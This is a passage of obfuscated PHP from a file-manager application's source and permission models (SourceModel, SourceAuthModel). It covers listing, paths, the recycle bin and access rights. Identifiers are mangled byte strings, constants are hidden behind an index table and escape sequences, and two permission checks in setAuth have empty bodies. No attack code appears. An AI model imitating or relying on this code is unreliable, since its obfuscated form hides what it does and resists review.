($ìë°ğÀ[$âùÒ¦–¿[$´¦˜•Á×[405]]] as $÷„ÁÇŒ­) { $âùÒ¦–¿[$´¦˜•Á×[97]][$´¦˜•Á×[488]] = array($´¦˜•Á×[489] => $÷„ÁÇŒ­[$´¦˜•Á×[490]], $´¦˜•Á×[491] => $÷„ÁÇŒ­[$´¦˜•Á×[492]], $´¦˜•Á×[493] => $÷„ÁÇŒ­[$´¦˜•Á×[405]], $´¦˜•Á×[494] => $÷„ÁÇŒ­[$´¦˜•Á×[495]], $´¦˜•Á×[496] => $÷„ÁÇŒ­[$´¦˜•Á×[497]], $´¦˜•Á×[498] => $÷„ÁÇŒ­[$´¦˜•Á×[498]], $´¦˜•Á×[499] => $÷„ÁÇŒ­[$´¦˜•Á×[499]]); } } } unset($âùÒ¦–¿); return $¬š·ù˜; } protected function _listAppendChildren(&$º«É©Ô¨, $æàÚëÕİ) { $óŸ°â· =& $_SERVER[ë¦»ºéÌ]; $³ş¹Òº = array(); $Í‹äÍŒ‚ = array($óŸ°â·[214] => 0, $óŸ°â·[215] => 0); foreach ($º«É©Ô¨ as &$—ğû®¤Ç) { if (!$—ğû®¤Ç[$óŸ°â·[413]]) { continue; } $³ş¹Òº[] = $—ğû®¤Ç[$óŸ°â·[405]]; } unset($—ğû®¤Ç); if (!$³ş¹Òº) { return; } $ãôûãÎ = array($óŸ°â·[500] => array($óŸ°â·[7], $³ş¹Òº)); $ñÄš…¾• = array($óŸ°â·[500], $óŸ°â·[413], $óŸ°â·[501] => $óŸ°â·[502]); $ÃÇ‚Õ¾› = $this->field($ñÄš…¾•)->where($ãôûãÎ)->group($óŸ°â·[503])->select(); $¾…ÖĞ = array(); foreach ($ÃÇ‚Õ¾› as $¦É¦®ô) { $±…»üÁ = $¦É¦®ô[$óŸ°â·[500]]; $ß…æÈÇ„ = $¦É¦®ô[$óŸ°â·[413]] == $óŸ°â·[99] ? $óŸ°â·[215] : $óŸ°â·[214]; if (!isset($¾…ÖĞ[$±…»üÁ])) { $¾…ÖĞ[$±…»üÁ] = array($óŸ°â·[214] => 0, $óŸ°â·[215] => 0); } $¾…ÖĞ[$±…»üÁ][$ß…æÈÇ„] += $¦É¦®ô[$óŸ°â·[502]]; } foreach ($º«É©Ô¨ as &$—ğû®¤Ç) { if (!$—ğû®¤Ç[$óŸ°â·[413]]) { continue; } $ èÉç× = is_array($¾…ÖĞ[$—ğû®¤Ç[$óŸ°â·[405]]]) ? $¾…ÖĞ[$—ğû®¤Ç[$óŸ°â·[405]]] : $Í‹äÍŒ‚; $—ğû®¤Ç[$óŸ°â·[215]] = $ èÉç×[$óŸ°â·[215]]; $—ğû®¤Ç[$óŸ°â·[214]] = $ èÉç×[$óŸ°â·[214]]; unset($—ğû®¤Ç[$óŸ°â·[415]]); } unset($—ğû®¤Ç); } protected function _listAppendAuth(&$Áü¾›­î) { $ÒâƒÀ—Î =& $_SERVER[ë¦»ºéÌ]; if (!defined($ÒâƒÀ—Î[476])) { return; } $¥Àòöœª = array(); foreach ($Áü¾›­î as $®„ı…´Î) { if ($®„ı…´Î[$ÒâƒÀ—Î[414]] == self::TYPE_GROUP) { $¥Àòöœª[] = $®„ı…´Î[$ÒâƒÀ—Î[405]]; } } if (!$¥Àòöœª) { return; } $‡ãİÃ‡ô = array_to_keyvalue($Áü¾›­î, $ÒâƒÀ—Î[405]); $ßóµ¢¥ù = Model($ÒâƒÀ—Î[504])->getSourceList($¥Àòöœª, $‡ãİÃ‡ô); foreach ($Áü¾›­î as $Óœ¥ê¾„ => &$®„ı…´Î) { $®„ı…´Î[$ÒâƒÀ—Î[416]] = $ßóµ¢¥ù[$®„ı…´Î[$ÒâƒÀ—Î[405]]]; if (!$®„ı…´Î[$ÒâƒÀ—Î[416]] && $®„ı…´Î[$ÒâƒÀ—Î[414]] == self::TYPE_GROUP) { $®„ı…´Î[$ÒâƒÀ—Î[416]] = Action($ÒâƒÀ—Î[505])->pathGroupAuthMake($®„ı…´Î[$ÒâƒÀ—Î[506]]); if (!$®„ı…´Î[$ÒâƒÀ—Î[416]] && !_get($GLOBALS, $ÒâƒÀ—Î[507])) { $®„ı…´Î[$ÒâƒÀ—Î[207]] = !1; $®„ı…´Î[$ÒâƒÀ—Î[206]] = !1; } } if ($®„ı…´Î[$ÒâƒÀ—Î[416]]) { $®„ı…´Î[$ÒâƒÀ—Î[207]] = AuthModel::authCheckEdit($®„ı…´Î[$ÒâƒÀ—Î[416]][$ÒâƒÀ—Î[417]]); $®„ı…´Î[$ÒâƒÀ—Î[206]] = AuthModel::authCheckView($®„ı…´Î[$ÒâƒÀ—Î[416]][$ÒâƒÀ—Î[417]]); } $this->groupPathDisplay($®„ı…´Î); } unset($®„ı…´Î); } public function _listAppendAuthSecret(&$„‚ÉÏ¶î) { $‘¥µıÜŞ =& $_SERVER[ë¦»ºéÌ]; if (Model($‘¥µıÜŞ[435])->get($‘¥µıÜŞ[508]) != $‘¥µıÜŞ[99]) { return; } static $ù¸·â¼Ê = false; if (!$ù¸·â¼Ê) { $‹¿¡ş = Model($‘¥µıÜŞ[509]); $˜ó¿Å™ = Model($‘¥µıÜŞ[510]); $ù¸·â¼Ê = $˜ó¿Å™->listData(); $ù¸·â¼Ê = array_to_keyvalue($ù¸·â¼Ê, $‘¥µıÜŞ[405]); $‡©¼ß§ó = json_decode(Model($‘¥µıÜŞ[435])->get($‘¥µıÜŞ[511]), !0); $‡©¼ß§ó = array_to_keyvalue($‡©¼ß§ó, $‘¥µıÜŞ[403]); foreach ($ù¸·â¼Ê as $İ‰›¶’Í => $«şÚ×) { $ƒ·Ó¨ÅÀ = $‡©¼ß§ó[$«şÚ×[$‘¥µıÜŞ[512]]]; if (!$ƒ·Ó¨ÅÀ) { $˜ó¿Å™->remove($«şÚ×[$‘¥µıÜŞ[403]]); unset($ù¸·â¼Ê[$İ‰›¶’Í]); continue; } $«­ƒ¤ó’ = $‹¿¡ş->listData($ƒ·Ó¨ÅÀ[$‘¥µıÜŞ[416]]); if (!$«­ƒ¤ó’) { $˜ó¿Å™->remove($«şÚ×[$‘¥µıÜŞ[403]]); unset($ù¸·â¼Ê[$İ‰›¶’Í]); continue; } $«şÚ×[$‘¥µıÜŞ[416]] = $«­ƒ¤ó’; $«şÚ×[$‘¥µıÜŞ[513]] = $ƒ·Ó¨ÅÀ; $«şÚ×[$‘¥µıÜŞ[514]] = Model($‘¥µıÜŞ[515])->getInfoSimpleOuter($«şÚ×[$‘¥µıÜŞ[454]]); $ù¸·â¼Ê[$İ‰›¶’Í] = $«şÚ×; } } $‡§Œ±½Ê = defined($‘¥µıÜŞ[516]) ? USER_ID : $‘¥µıÜŞ[12]; $¿‚ÀÆ = array(); $»Ñ”ïë“ = $this->_listAppendPath($¿‚ÀÆ, !0); foreach ($„‚ÉÏ¶î as $İ‰›¶’Í => &$«şÚ×) { if (!is_array($«şÚ×[$‘¥µıÜŞ[416]])) { continue; } if ($«şÚ×[$‘¥µıÜŞ[414]] != $‘¥µıÜŞ[517]) { continue; } if (isset($ù¸·â¼Ê[$«şÚ×[$‘¥µıÜŞ[405]]])) { $Ø¯Çâí­ = $ù¸·â¼Ê[$«şÚ×[$‘¥µıÜŞ[405]]]; if (!is_array($«şÚ×[$‘¥µıÜŞ[467]])) { $«şÚ×[$‘¥µıÜŞ[467]] = array(); } $«şÚ×[$‘¥µıÜŞ[467]][$‘¥µıÜŞ[518]] = $Ø¯Çâí­[$‘¥µıÜŞ[512]]; $«şÚ×[$‘¥µıÜŞ[416]][$‘¥µıÜŞ[519]] = $Ø¯Çâí­; $«şÚ×[$‘¥µıÜŞ[416]][$‘¥µıÜŞ[520]] = $«şÚ×[$‘¥µıÜŞ[521]]; $«şÚ×[$‘¥µıÜŞ[416]][$‘¥µıÜŞ[522]] = $‘¥µıÜŞ[99]; if ($Ø¯Çâí­[$‘¥µıÜŞ[454]] != $‡§Œ±½Ê) { $«şÚ×[$‘¥µıÜŞ[416]][$‘¥µıÜŞ[417]] = $«şÚ×[$‘¥µıÜŞ[416]][$‘¥µıÜŞ[417]] & $Ø¯Çâí­[$‘¥µıÜŞ[416]][$‘¥µıÜŞ[416]]; } continue; } $«›²‹İª = $this->parentLevelArray($«şÚ×[$‘¥µıÜŞ[523]]); $–Àñš¤² = array_reverse($«›²‹İª); foreach ($–Àñš¤² as $Ø§×ìÏ  => $ƒĞè²ÆÜ) { if (!isset($ù¸·â¼Ê[$ƒĞè²ÆÜ])) { continue; } $Ø¯Çâí­ = $ù¸·â¼Ê[$ƒĞè²ÆÜ]; $«şÚ×[$‘¥µıÜŞ[416]][$‘¥µıÜŞ[519]] = $Ø¯Çâí­; if ($Ø¯Çâí­[$‘¥µıÜŞ[454]] != $‡§Œ±½Ê) { $«şÚ×[$‘¥µıÜŞ[416]][$‘¥µıÜŞ[417]] = $«şÚ×[$‘¥µıÜŞ[416]][$‘¥µıÜŞ[417]] & $Ø¯Çâí­[$‘¥µıÜŞ[416]][$‘¥µıÜŞ[416]]; } $ú’ª«¶ = $‘¥µıÜŞ[12]; $ËÃ²·–™ = count($«›²‹İª) - $Ø§×ìÏ ; for ($åÒ³¹ê = 0; $åÒ³¹ê < $ËÃ²·–™; $åÒ³¹ê++) { if (!isset($»Ñ”ïë“[$«›²‹İª[$åÒ³¹ê]])) { $ú’ª«¶ = $‘¥µıÜŞ[12]; break; } $ú’ª«¶ = $ú’ª«¶ . rtrim($»Ñ”ïë“[$«›²‹İª[$åÒ³¹ê]], $‘¥µıÜŞ[8]) . $‘¥µıÜŞ[8]; } $«şÚ×[$‘¥µıÜŞ[416]][$‘¥µıÜŞ[520]] = rtrim($ú’ª«¶, $‘¥µıÜŞ[8]) . $‘¥µıÜŞ[8]; break; } } unset($«şÚ×); } public function groupPathDisplay(&$ˆËØŒ¸Ç) { $ûæÇ¿è =& $_SERVER[ë¦»ºéÌ]; if ($ˆËØŒ¸Ç[$ûæÇ¿è[414]] != self::TYPE_GROUP) { return; } $—÷®¥¥İ = Model($ûæÇ¿è[524])->getInfo($ˆËØŒ¸Ç[$ûæÇ¿è[506]]); $Å©¢É•Ã = $this->parentLevelArray($—÷®¥¥İ[$ûæÇ¿è[523]]); $Ê±§Ü¦¨ = $ûæÇ¿è[12]; foreach ($Å©¢É•Ã as $¦˜Ø¤ş§) { $ùà¤ã÷¾ = Model($ûæÇ¿è[524])->getInfo($¦˜Ø¤ş§); $Ê±§Ü¦¨ .= $ùà¤ã÷¾[$ûæÇ¿è[97]][$ûæÇ¿è[405]] . $ûæÇ¿è[60]; } $ˆËØŒ¸Ç[$ûæÇ¿è[525]] = $—÷®¥¥İ[$ûæÇ¿è[500]]; $ˆËØŒ¸Ç[$ûæÇ¿è[526]] = $—÷®¥¥İ[$ûæÇ¿è[523]]; $ˆËØŒ¸Ç[$ûæÇ¿è[527]] = $—÷®¥¥İ[$ûæÇ¿è[528]]; $ˆËØŒ¸Ç[$ûæÇ¿è[529]] = $Ê±§Ü¦¨ . $—÷®¥¥İ[$ûæÇ¿è[97]][$ûæÇ¿è[405]]; } protected function _listAppendPath(&$‰Á–«ô®, $”ã›œ±· = false) { $ÙÖëñğØ =& $_SERVER[ë¦»ºéÌ]; static $¸ü¯¢Ê— = array(); $Ã­ûø€‡ = array(); $§½…óáÀ = array(); if ($”ã›œ±·) { return $¸ü¯¢Ê—; } foreach ($‰Á–«ô® as &$ÎŸ¦˜) { $ÅÜ ‹â = $ÎŸ¦˜[$ÙÖëñğØ[405]]; if ($ÎŸ¦˜[$ÙÖëñğØ[413]] == $ÙÖëñğØ[99] && $ÎŸ¦˜[$ÙÖëñğØ[500]] != 0) { $¸ü¯¢Ê—[$ÅÜ ‹â] = $ÎŸ¦˜[$ÙÖëñğØ[42]]; } if ($ÎŸ¦˜[$ÙÖëñğØ[413]] == $ÙÖëñğØ[99] && $ÎŸ¦˜[$ÙÖëñğØ[500]] == 0 && !isset($¸ü¯¢Ê—[$ÅÜ ‹â])) { $¸ü¯¢Ê—[$ÅÜ ‹â] = $this->_listAppendPathRoot($ÎŸ¦˜, array()); } if (isset($§½…óáÀ[$ÎŸ¦˜[$ÙÖëñğØ[523]]])) { continue; } $§½…óáÀ[$ÎŸ¦˜[$ÙÖëñğØ[523]]] = !0; $·‹–İ¶î = $this->parentLevelArray($ÎŸ¦˜[$ÙÖëñğØ[523]]); foreach ($·‹–İ¶î as $©’›‘Ì¡ => $‰¹“¨Œ˜) { if (isset($¸ü¯¢Ê—[$‰¹“¨Œ˜])) { continue; } if ($©’›‘Ì¡ == 0) { $¸ü¯¢Ê—[$‰¹“¨Œ˜] = $this->_listAppendPathRoot($ÎŸ¦˜, $·‹–İ¶î); } if ($©’›‘Ì¡ != 0) { $Ã­ûø€‡[] = $‰¹“¨Œ˜; } } } unset($ÎŸ¦˜); $Ã­ûø€‡ = array_unique($Ã­ûø€‡); if (count($Ã­ûø€‡) > 0) { $©ã‚ší® = array($ÙÖëñğØ[420] => array($ÙÖëñğØ[421], $Ã­ûø€‡)); if (count($Ã­ûø€‡) == 1) { $ìß¦µÌ× = $this->sourceInfo($Ã­ûø€‡[0]); $¬¨Ô‰ = is_array($ìß¦µÌ×) ? array($ìß¦µÌ×) : !1; } else { $¬¨Ô‰ = $this->field($ÙÖëñğØ[530])->where($©ã‚ší®)->select(); } if (!$¬¨Ô‰) { $¬¨Ô‰ = array(); } foreach ($¬¨Ô‰ as $è¦È£¬‘) { $¸ü¯¢Ê—[$è¦È£¬‘[$ÙÖëñğØ[405]]] = $è¦È£¬‘[$ÙÖëñğØ[42]]; } } $Éíô† = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ÒÔµ¾ª„ = array(); foreach ($‰Á–«ô® as &$ÎŸ¦˜) { $ñ‘ú¥Ï = $ÎŸ¦˜[$ÙÖëñğØ[523]]; $ù¤‡Õ¸º = $ÙÖëñğØ[12]; if (isset($ÒÔµ¾ª„[$ñ‘ú¥Ï])) { $ù¤‡Õ¸º = $ÒÔµ¾ª„[$ñ‘ú¥Ï]; } else { $·‹–İ¶î = $this->parentLevelArray($ÎŸ¦˜[$ÙÖëñğØ[523]]); foreach ($·‹–İ¶î as $©’›‘Ì¡ => $‰¹“¨Œ˜) { if (isset($¸ü¯¢Ê—[$‰¹“¨Œ˜])) { $ù¤‡Õ¸º .= $¸ü¯¢Ê—[$‰¹“¨Œ˜] . $ÙÖëñğØ[8]; } } $ÒÔµ¾ª„[$ñ‘ú¥Ï] = $ù¤‡Õ¸º; } $ù¤‡Õ¸º .= $ÎŸ¦˜[$ÙÖëñğØ[42]]; if ($ÎŸ¦˜[$ÙÖëñğØ[413]] == $ÙÖëñğØ[99]) { $ù¤‡Õ¸º .= $ÙÖëñğØ[8]; } $ÎŸ¦˜[$ÙÖëñğØ[521]] = str_replace($ÙÖëñğØ[531], $ÙÖëñğØ[8], $ù¤‡Õ¸º); if ($ÎŸ¦˜[$ÙÖëñğØ[500]] == $ÙÖëñğØ[202]) { $ÎŸ¦˜[$ÙÖëñğØ[42]] = trim($¸ü¯¢Ê—[$ÎŸ¦˜[$ÙÖëñğØ[405]]], $ÙÖëñğØ[8]); $ÎŸ¦˜[$ÙÖëñğØ[521]] = $ÎŸ¦˜[$ÙÖëñğØ[42]] . $ÙÖëñğØ[8]; } if (intval($ÎŸ¦˜[$ÙÖëñğØ[414]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ÎŸ¦˜, $·‹–İ¶î, $Éíô†); } } unset($ÎŸ¦˜); return $‰Á–«ô®; } private function _listAppendPathRecycle(&$ÒÓÂÁÇ€, $³ÒìÎï‘, $—óÉáœî) { $ğòÃâÃ­ =& $_SERVER[ë¦»ºéÌ]; if (!in_array($—óÉáœî, $³ÒìÎï‘) && $ÒÓÂÁÇ€[$ğòÃâÃ­[405]] != $—óÉáœî) { return; } $®ôßî«¼ = explode($ğòÃâÃ­[8], trim($ÒÓÂÁÇ€[$ğòÃâÃ­[521]], $ğòÃâÃ­[8])); $ší«‘÷ = implode($ğòÃâÃ­[8], array_slice($®ôßî«¼, 2)); $ÒÓÂÁÇ€[$ğòÃâÃ­[521]] = $ğòÃâÃ­[8] . LNG($ğòÃâÃ­[532]) . $ğòÃâÃ­[8] . ltrim($ší«‘÷, $ğòÃâÃ­[8]); $ÒÓÂÁÇ€[$ğòÃâÃ­[523]] = $ğòÃâÃ­[533] . implode($ğòÃâÃ­[60], array_slice($³ÒìÎï‘, 1)) . $ğòÃâÃ­[60]; if ($ÒÓÂÁÇ€[$ğòÃâÃ­[405]] == $—óÉáœî) { $ÒÓÂÁÇ€[$ğòÃâÃ­[523]] = $ğòÃâÃ­[533]; $ÒÓÂÁÇ€[$ğòÃâÃ­[500]] = $ğòÃâÃ­[202]; $ÒÓÂÁÇ€[$ğòÃâÃ­[42]] = LNG($ğòÃâÃ­[532]); } $ÒÓÂÁÇ€[$ğòÃâÃ­[534]] = $ğòÃâÃ­[535]; } protected function _listAppendPathRoot(&$‰ÒŒÚÁİ, $Ğ‹åˆş‰) { $ÏÂä¬œ =& $_SERVER[ë¦»ºéÌ]; $Ä¬¼ÛÈİ = $ÏÂä¬œ[12]; if ($‰ÒŒÚÁİ[$ÏÂä¬œ[414]] == self::TYPE_USER) { if (defined($ÏÂä¬œ[476]) && $‰ÒŒÚÁİ[$ÏÂä¬œ[506]] == USER_ID) { $Ä¬¼ÛÈİ = LNG($ÏÂä¬œ[536]); if (!$Ğ‹åˆş‰) { $‰ÒŒÚÁİ[$ÏÂä¬œ[42]] = $Ä¬¼ÛÈİ; } } else { $˜£ß¥‹± = Model($ÏÂä¬œ[515])->getInfoSimple($‰ÒŒÚÁİ[$ÏÂä¬œ[506]]); $Ä¬¼ÛÈİ = LNG($ÏÂä¬œ[537]) . $ÏÂä¬œ[171] . $˜£ß¥‹±[$ÏÂä¬œ[42]] . $ÏÂä¬œ[538]; } } else { if ($‰ÒŒÚÁİ[$ÏÂä¬œ[414]] == self::TYPE_GROUP) { $˜£ß¥‹± = Model($ÏÂä¬œ[524])->getInfoSimple($‰ÒŒÚÁİ[$ÏÂä¬œ[506]]); $Ä¬¼ÛÈİ = $˜£ß¥‹±[$ÏÂä¬œ[42]]; } else { if ($‰ÒŒÚÁİ[$ÏÂä¬œ[414]] == self::TYPE_SYSTEM) { $Ä¬¼ÛÈİ = $ÏÂä¬œ[539]; } } } $Ä¬¼ÛÈİ = $Ä¬¼ÛÈİ ? $ÏÂä¬œ[8] . $Ä¬¼ÛÈİ . $ÏÂä¬œ[8] : $ÏÂä¬œ[8]; return $Ä¬¼ÛÈİ; } protected function _listAppendUser(&$†óé€‚) { $¶à­šà† =& $_SERVER[ë¦»ºéÌ]; $ÊŞ„İ™ = array_to_keyvalue($†óé€‚, $¶à­šà†[12], $¶à­šà†[454]); $ô›‘ø = array_to_keyvalue($†óé€‚, $¶à­šà†[12], $¶à­šà†[456]); $¹‹ªìÎÖ = array_merge($ÊŞ„İ™, $ô›‘ø); $åŞ¥Î´– = Model($¶à­šà†[540])->userListInfo($¹‹ªìÎÖ); foreach ($†óé€‚ as &$³Öáœ×­) { $™³Ôñ§ = $³Öáœ×­[$¶à­šà†[454]]; $³Öáœ×­[$¶à­šà†[454]] = $åŞ¥Î´–[$™³Ôñ§] ? $åŞ¥Î´–[$™³Ôñ§] : !1; $™³Ôñ§ = $³Öáœ×­[$¶à­šà†[456]]; $³Öáœ×­[$¶à­šà†[456]] = $åŞ¥Î´–[$™³Ôñ§] ? $åŞ¥Î´–[$™³Ôñ§] : !1; if (isset($³Öáœ×­[$¶à­šà†[467]]) && $³Öáœ×­[$¶à­šà†[467]][$¶à­šà†[541]]) { $¡ªĞ´éÌ = $GLOBALS[$¶à­šà†[6]][$¶à­šà†[100]][$¶à­šà†[542]]; if ($³Öáœ×­[$¶à­šà†[467]][$¶à­šà†[543]] <= time() - $¡ªĞ´éÌ) { $this->metaSet($³Öáœ×­[$¶à­šà†[405]], $¶à­šà†[541], null); $this->metaSet($³Öáœ×­[$¶à­šà†[405]], $¶à­šà†[543], null); unset($³Öáœ×­[$¶à­šà†[467]][$¶à­šà†[541]]); continue; } $•óŒÊ¢ó = $³Öáœ×­[$¶à­šà†[467]][$¶à­šà†[541]]; $³Öáœ×­[$¶à­šà†[467]][$¶à­šà†[544]] = Model($¶à­šà†[540])->getInfoSimpleOuter($•óŒÊ¢ó); } } unset($³Öáœ×­); } public function parentLevelArray($Øèà…ˆ‹) { $ìã¼à· =& $_SERVER[ë¦»ºéÌ]; $Øèà…ˆ‹ = explode($ìã¼à·[60], trim($Øèà…ˆ‹, $ìã¼à·[60])); return array_remove_value($Øèà…ˆ‹, $ìã¼à·[202]); } public function listAll($°¬²ıú§) { $ËââÄ€ò =& $_SERVER[ë¦»ºéÌ]; $É¾ğ·Íâ = $this->sourceInfo($°¬²ıú§); $Ö²Ùµ˜ = array($ËââÄ€ò[545] => array($ËââÄ€ò[546], $É¾ğ·Íâ[$ËââÄ€ò[523]] . $°¬²ıú§ . $ËââÄ€ò[547]), $ËââÄ€ò[548] => 0); $øœ×ºĞ´ = $ËââÄ€ò[549]; $¶ÆƒÓÊ = "\114\x45\106\124\40\112\x4f\x49\x4e\40{$this->tablePrefix}\x69\x6f\x5f\x66\x69\x6c\145\40\x66\x69\x6c\x65\x20\157\156\40\x73\157\x75\x72\143\x65\x2e\146\151\154\145\x49\104\40\x3d\x20\x66\x69\x6c\x65\56\146\151\x6c\145\x49\x44"; $ÁÅåß‹• = $this->alias($ËââÄ€ò[446])->field($øœ×ºĞ´)->where($Ö²Ùµ˜)->join($¶ÆƒÓÊ)->select(); $this->_listAppendAuth($ÁÅåß‹•); $this->_listAppendUser($ÁÅåß‹•); $this->_listAppendPath($ÁÅåß‹•); $ÁÅåß‹• = array_to_keyvalue($ÁÅåß‹•, $ËââÄ€ò[405]); $¯ı“¯ŠÚ = "\x2f{$É¾ğ·Íâ[$ËââÄ€ò[42]]}\57"; $¯ı“¯ŠÚ = $¯ı“¯ŠÚ == $ËââÄ€ò[531] ? $ËââÄ€ò[8] : $¯ı“¯ŠÚ; $•Öãë§Ÿ = array(); foreach ($ÁÅåß‹• as $¶›©öšÂ => $˜Ù¾ÎŸÏ) { $ÖóÃÜ³ = $this->parentLevelArray($˜Ù¾ÎŸÏ[$ËââÄ€ò[523]]); array_shift($ÖóÃÜ³); $‹ÁÇŠ¹Í = $¯ı“¯ŠÚ; for ($ëí¼äØĞ = 0; $ëí¼äØĞ < count($ÖóÃÜ³); $ëí¼äØĞ++) { $‹ÁÇŠ¹Í .= $ÁÅåß‹•[$ÖóÃÜ³[$ëí¼äØĞ]][$ËââÄ€ò[42]] . $ËââÄ€ò[8]; } $‹ÁÇŠ¹Í .= $˜Ù¾ÎŸÏ[$ËââÄ€ò[42]]; if ($˜Ù¾ÎŸÏ[$ËââÄ€ò[413]]) { $‹ÁÇŠ¹Í .= $ËââÄ€ò[8]; } $‹ÁÇŠ¹Í = str_replace($ËââÄ€ò[531], $ËââÄ€ò[8], $‹ÁÇŠ¹Í); $‹ÁÇŠ¹Í = str_replace($ËââÄ€ò[531], $ËââÄ€ò[8], $‹ÁÇŠ¹Í); $ÇÍ—Ÿ›å = array($ËââÄ€ò[424] => str_replace($ËââÄ€ò[531], $ËââÄ€ò[8], $‹ÁÇŠ¹Í), $ËââÄ€ò[550] => intval($˜Ù¾ÎŸÏ[$ËââÄ€ò[413]]), $ËââÄ€ò[97] => $this->pathInfoFilter($˜Ù¾ÎŸÏ)); if (!$˜Ù¾ÎŸÏ[$ËââÄ€ò[413]]) { $ÇÍ—Ÿ›å[$ËââÄ€ò[469]] = $˜Ù¾ÎŸÏ[$ËââÄ€ò[469]]; $ÇÍ—Ÿ›å[$ËââÄ€ò[98]] = $˜Ù¾ÎŸÏ[$ËââÄ€ò[88]]; } $•Öãë§Ÿ[] = $ÇÍ—Ÿ›å; } return $•Öãë§Ÿ; } } goto aÓºÈ‡Ø¿‚; aÏ¡çì®Ğ²: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\165\x72\143\x65\x5f\x61\165\x74\150"; public function getAuth($°ğõ†Ø´) { $™ã¤û²“ =& $_SERVER[ë¦»ºéÌ]; $ğÅ’ßÕ = $this->sourceAuthSelect($°ğõ†Ø´); $Ã‹Õò‡İ = array(); $¶ñúÕÃÉ = array(); $íùğ½‘ä = 2 << 25; foreach ($ğÅ’ßÕ as $¹Á”Ÿì) { $ùØš‰«¨ = Model($™ã¤û²“[509])->listData($¹Á”Ÿì[$™ã¤û²“[1901]]); if (!$ùØš‰«¨) { continue; } $Ã‹Õò‡İ[] = $¹Á”Ÿì; $ØÊŒÃÒ° = 0; if ($¹Á”Ÿì[$™ã¤û²“[414]] == SourceModel::TYPE_GROUP) { $ØÊŒÃÒ° = $íùğ½‘ä * 2; } if ($¹Á”Ÿì[$™ã¤û²“[414]] == SourceModel::TYPE_USER) { $ØÊŒÃÒ° = $íùğ½‘ä; } if ($¹Á”Ÿì[$™ã¤û²“[414]] == SourceModel::TYPE_USER && $¹Á”Ÿì[$™ã¤û²“[506]] == $™ã¤û²“[202]) { $ØÊŒÃÒ° = 0; } $¶ñúÕÃÉ[] = $ùØš‰«¨[$™ã¤û²“[416]] + $ØÊŒÃÒ°; } array_multisort($¶ñúÕÃÉ, SORT_DESC, $Ã‹Õò‡İ); return $Ã‹Õò‡İ; } public function sourceAuthSelect($öÜùÉí™) { $ÌìÆØÒ½ =& $_SERVER[ë¦»ºéÌ]; static $Ã®®–Û© = array(); $òÖ¤‡¼ = is_array($öÜùÉí™) ? !1 : !0; if ($òÖ¤‡¼) { $öÜùÉí™ = array($öÜùÉí™); } $úéš«¸Â = array(); foreach ($öÜùÉí™ as $ùÄãùºé) { if (isset($Ã®®–Û©[$ùÄãùºé])) { $úéš«¸Â[$ùÄãùºé] = $Ã®®–Û©[$ùÄãùºé]; } } if (count($úéš«¸Â) == count($öÜùÉí™)) { return $òÖ¤‡¼ ? $úéš«¸Â[$öÜùÉí™[0]] : $úéš«¸Â; } $Í¹ìÍ· = $ÌìÆØÒ½[1972]; $ÔÏ„§Í = array($ÌìÆØÒ½[405] => array($ÌìÆØÒ½[7], $öÜùÉí™)); $–å½É§ó = $this->field($Í¹ìÍ·)->order($ÌìÆØÒ½[403])->where($ÔÏ„§Í)->select(); $ßáŸÒ´Ô = array_to_keyvalue_group($–å½É§ó, $ÌìÆØÒ½[405]); foreach ($öÜùÉí™ as $ùÄãùºé) { $Ã®®–Û©[$ùÄãùºé] = $ßáŸÒ´Ô[$ùÄãùºé] ? $ßáŸÒ´Ô[$ùÄãùºé] : array(); } if ($òÖ¤‡¼) { return $–å½É§ó; } return $ßáŸÒ´Ô; } public function setAuth($È™€Ş—, $½Ó×ŸÔ) { $Ãƒ¸ò“Ì =& $_SERVER[ë¦»ºéÌ]; $Ø©ªÁÒÏ = Model($Ãƒ¸ò“Ì[1305])->sourceInfo($È™€Ş—); if (!$Ø©ªÁÒÏ) { return !1; } if ($Ø©ªÁÒÏ[$Ãƒ¸ò“Ì[414]] != SourceModel::TYPE_GROUP) { return !1; } $Ë¿óÂ•‘ = 1; $ÒÇú«£ = $Ø©ªÁÒÏ[$Ãƒ¸ò“Ì[506]]; if ($ÒÇú«£ != $Ë¿óÂ•‘) { $Í…ÌÆ©† = array($Ãƒ¸ò“Ì[1800] => $ÒÇú«£); $¶‚»¡÷Ô = Model($Ãƒ¸ò“Ì[1889])->field($Ãƒ¸ò“Ì[1632])->where($Í…ÌÆ©†)->select(); $¶‚»¡÷Ô = array_to_keyvalue($¶‚»¡÷Ô, $Ãƒ¸ò“Ì[12], $Ãƒ¸ò“Ì[1632]); } $¶ëÌŸÉØ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $°ªÏô = array(); foreach ($½Ó×ŸÔ as $‰øî†‘‰) { if (!in_array($‰øî†‘‰[$Ãƒ¸ò“Ì[414]], $¶ëÌŸÉØ)) { show_json(LNG($Ãƒ¸ò“Ì[1973]), !1); } if ($ÒÇú«£ != $Ë¿óÂ•‘) { if ($‰øî†‘‰[$Ãƒ¸ò“Ì[414]] == SourceModel::TYPE_GROUP) { } if ($‰øî†‘‰[$Ãƒ¸ò“Ì[506]] != 0 && !in_array($‰øî†‘‰[$Ãƒ¸ò“Ì[506]], $¶‚»¡÷Ô)) { } } if ($‰øî†‘‰[$Ãƒ¸ò“Ì[506]] == 0) { $‰øî†‘‰[$Ãƒ¸ò“Ì[414]] = SourceModel::TYPE_USER; } $°ªÏô[] = array($Ãƒ¸ò“Ì[405] => $È™€Ş—, $Ãƒ¸ò“Ì[414] => intval($‰øî†‘‰[$Ãƒ¸ò“Ì[414]]), $Ãƒ¸ò“Ì[506] => intval($‰øî†‘‰[$Ãƒ¸ò“Ì[506]]), $Ãƒ¸ò“Ì[1901] => intval($‰øî†‘‰[$Ãƒ¸ò“Ì[1901]]) ? intval($‰øî†‘‰[$Ãƒ¸ò“Ì[1901]]) : 0, $Ãƒ¸ò“Ì[1955] => intval($‰øî†‘‰[$Ãƒ¸ò“Ì[1955]]) ? intval($‰øî†‘‰[$Ãƒ¸ò“Ì[1955]]) : -1); } $this->where(array($Ãƒ¸ò“Ì[420] => $È™€Ş—))->delete(); $this->addAll($°ªÏô); return !0; } public function authClear($éİ¹ƒ¡Õ) { $Ä Ï™ÜŒ =& $_SERVER[ë¦»ºéÌ]; $á’¸¢¼ı = Model($Ä Ï™ÜŒ[1305])->sourceInfo($éİ¹ƒ¡Õ); $ßÇîÅ€ß = array($éİ¹ƒ¡Õ); if ($á’¸¢¼ı[$Ä Ï™ÜŒ[413]] == $Ä Ï™ÜŒ[99]) { $‹ØŞ¥•Ê = 